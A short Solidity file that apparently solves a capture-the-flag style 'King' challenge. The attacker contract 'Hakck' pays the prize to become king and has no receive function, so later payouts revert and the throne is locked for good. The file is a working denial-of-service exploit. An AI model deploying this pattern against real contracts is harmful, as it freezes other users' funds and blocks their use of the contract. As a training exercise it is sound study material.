// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hakck{
    constructor(address payable _addr) payable{
        uint price = King(_addr).prize();
        (bool success,) = _addr.call{value:price}("");
        require(success,"failed call");
    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
